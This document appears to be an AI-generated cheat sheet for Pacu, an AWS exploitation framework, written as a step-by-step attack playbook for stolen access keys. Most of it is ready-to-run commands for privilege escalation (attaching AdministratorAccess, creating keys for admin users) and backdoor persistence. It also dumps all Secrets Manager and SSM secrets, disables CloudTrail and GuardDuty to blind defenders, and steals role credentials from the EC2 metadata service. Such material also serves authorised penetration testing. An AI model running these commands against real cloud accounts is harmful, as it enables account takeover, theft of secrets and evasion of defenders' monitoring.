# Pacu

**Tags:** `#pacu` `#aws` `#cloud` `#enumeration` `#privesc` `#postexploitation` `#iam`

AWS exploitation framework — the AWS equivalent of Metasploit. Modular architecture with 35+ modules covering IAM enumeration, privilege escalation, persistence, data exfiltration, and lateral movement across AWS services. Operates using stolen or found AWS access keys and respects the permissions of those keys.

**Source:** https://github.com/RhinoSecurityLabs/pacu
**Install:** `pip install pacu` or `git clone https://github.com/RhinoSecurityLabs/pacu && pip install -r requirements.txt`

```bash
# Launch Pacu
pacu

# Or from clone
python3 pacu.py
```

> [!note] **Pacu vs AWS CLI** — AWS CLI is better for targeted, single commands. Pacu automates enumeration across an entire account, chains privileges, and tracks everything in a session database. Start with Pacu for broad recon, then use AWS CLI for targeted follow-up.

---

## Session Setup

Pacu uses sessions to store keys and findings across runs.

```
# Create new session
Pacu> new_session <session_name>

# Set access keys
Pacu> set_keys
# Enter: Access Key ID, Secret Access Key, Session Token (if STS/assumed role)

# Or import from AWS CLI config
Pacu> import_keys <profile_name>

# List sessions
Pacu> list_sessions

# Switch session
Pacu> swap_session <session_name>

# Show current keys / identity
Pacu> whoami
```

---

## Core Commands

```
# List all available modules
Pacu> list

# Search modules
Pacu> search iam
Pacu> search enum
Pacu> search privesc

# Run a module
Pacu> run <module_name>
Pacu> run <module_name> --regions us-east-1,us-west-2

# View module help
Pacu> help <module_name>

# View gathered data
Pacu> data
Pacu> data IAM
Pacu> data EC2

# View session info
Pacu> sessions
Pacu> whoami

# Export data to JSON
Pacu> export_keys --profile <name>
```

---

## Step 1 — Identity & Account Recon

Always start here — establish what account/identity you're working with.

```
# Who am I?
Pacu> run iam__detect_honeytokens       # check if keys are canary tokens
Pacu> whoami                             # current user ARN, account ID

# AWS CLI equivalent (quick check before launching Pacu)
aws sts get-caller-identity
aws iam get-user
```

```bash
# Manual account recon via CLI
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-user-policy --user-name <user> --policy-name <policy>
```

---

## Step 2 — IAM Enumeration

```
Pacu> run iam__enum_users_roles_policies_groups
# Enumerates: all users, roles, groups, policies, and their relationships
# Stored in session data — view with: data IAM

Pacu> run iam__enum_permissions
# Maps what the current user/role is actually allowed to do
# Critical for privilege escalation planning
```

```bash
# Manual IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-groups
aws iam list-policies --scope Local    # customer-managed only
aws iam get-policy-version --policy-arn <arn> --version-id v1
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>    # inline policies
```

---

## Step 3 — Service Enumeration

```
# EC2
Pacu> run ec2__enum
# Lists: instances, security groups, VPCs, subnets, key pairs, snapshots, AMIs

# S3
Pacu> run s3__enum
# Lists all accessible buckets

Pacu> run s3__download_bucket
# Downloads contents of accessible S3 buckets (look for creds, configs, backups)

# Lambda
Pacu> run lambda__enum
# Lists functions, environment variables (often contain secrets), layers

# Secrets Manager / SSM Parameter Store
Pacu> run secretsmanager__enum
Pacu> run ssm__enum
# Dumps all accessible secrets — frequently contains DB passwords, API keys

# CloudFormation
Pacu> run cloudformation__enum
# Templates often contain plaintext secrets and infrastructure layout

# RDS / databases
Pacu> run rds__enum

# ECS / ECR (containers)
Pacu> run ecs__enum
Pacu> run ecr__enum

# EKS (Kubernetes)
Pacu> run eks__enum
```

---

## Step 4 — Privilege Escalation

```
# Automated PrivEsc check — tests all known escalation paths for current permissions
Pacu> run iam__privesc_scan
# Checks 20+ privesc methods: policy attachment, role assumption, Lambda abuse, etc.
```

**Common AWS PrivEsc paths:**

| Method | Required Permission | Result |
|---|---|---|
| Attach admin policy to self | `iam:AttachUserPolicy` | Direct admin |
| Create new access key for existing admin | `iam:CreateAccessKey` | Pivot to admin user |
| Update assume-role policy | `iam:UpdateAssumeRolePolicy` | Assume admin role |
| Pass role to Lambda + invoke | `iam:PassRole` + `lambda:InvokeFunction` | Execute as privileged role |
| Create EC2 with instance profile | `iam:PassRole` + `ec2:RunInstances` | EC2 gets admin role creds via IMDS |
| Update Lambda function code | `lambda:UpdateFunctionCode` | Execute as Lambda's role |
| Create policy version | `iam:CreatePolicyVersion` | Overwrite managed policy with admin |
| Update EC2 user data | `ec2:ModifyInstanceAttribute` | Code exec on reboot as instance role |
| Create SSO permission set | `sso:CreatePermissionSet` | Assign admin to controlled account |
| Glue development endpoint | `glue:CreateDevEndpoint` + `iam:PassRole` | Shell with role attached |

```bash
# Manual privesc — attach admin policy to self
aws iam attach-user-policy \
  --user-name <current-user> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create new access key for target user (if CreateAccessKey allowed)
aws iam create-access-key --user-name <admin-user>

# Assume a role
aws sts assume-role --role-arn arn:aws:iam::<account>:role/<role> --role-session-name pwned
# Use returned AccessKeyId, SecretAccessKey, SessionToken as new keys
```

---

## Step 5 — Persistence

```
Pacu> run iam__backdoor_users_keys
# Creates new access keys on existing IAM users

Pacu> run iam__backdoor_users_password
# Sets a console password on existing users

Pacu> run ec2__backdoor_ec2_sec_groups
# Adds inbound rules to security groups (e.g. open SSH/RDP from attacker IP)

Pacu> run lambda__backdoor_new_roles
# Attaches malicious trust policy to newly created roles
```

---

## Step 6 — Data Exfiltration

```
# S3 — bulk download
Pacu> run s3__download_bucket

# Find secrets in Lambda environment variables
Pacu> run lambda__enum
Pacu> data Lambda    # check environmentVariables fields

# CloudTrail — disable logging to blind defenders
Pacu> run cloudtrail__download_event_history   # get your own activity logs first
Pacu> run detection__disruption               # disable GuardDuty, CloudTrail, Config

# EBS snapshots — copy to attacker account and mount
Pacu> run ebs__enum_snapshots_unauth          # find public snapshots
```

---

## Useful AWS CLI One-Liners

```bash
# Find all S3 buckets and check public access
aws s3 ls
aws s3 ls s3://<bucket> --recursive
aws s3 cp s3://<bucket>/<file> .

# Dump all Secrets Manager secrets
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | \
  tr '\t' '\n' | xargs -I{} aws secretsmanager get-secret-value --secret-id {}

# Dump SSM Parameter Store (SecureString included if KMS access exists)
aws ssm describe-parameters --query 'Parameters[*].Name' --output text | \
  tr '\t' '\n' | xargs -I{} aws ssm get-parameter --name {} --with-decryption

# List Lambda functions and their env vars
aws lambda list-functions --query 'Functions[*].FunctionName' --output text | \
  tr '\t' '\n' | xargs -I{} aws lambda get-function-configuration --function-name {} | \
  jq '{name:.FunctionName, env:.Environment.Variables}'

# Enumerate EC2 instance metadata from inside an instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token — use these as STS credentials
```

---

## IMDS Credential Theft (from inside EC2)

```bash
# IMDSv1 (no auth — if not disabled)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# IMDSv2 (requires token — most modern instances)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Use returned credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
